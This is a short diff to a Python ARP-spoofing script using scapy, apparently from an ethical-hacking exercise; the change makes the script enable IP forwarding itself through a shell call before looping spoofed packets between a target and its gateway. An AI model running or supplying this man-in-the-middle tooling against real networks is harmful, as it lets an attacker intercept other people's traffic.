@@ -1,12 +1,9 @@
 #!/usr/bin/env python
+import argparse
+import subprocess
 import time
 
 import scapy.all as scapy
-import argparse
-
-
-# Exec on attacker machine
-# echo 1 > /proc/sys/net/ipv4/ip_forward
 
 
 def get_arguments():
@@ -47,6 +44,9 @@ target_ip = options.target
 gateway_ip = options.gateway
 
 try:
+    # Setup port forwarding
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    print("Port forwarding setup done!")
     sent_packets_count = 0
     while True:
         spoof(target_ip, gateway_ip)  # Send to target. Set attacker machine as router
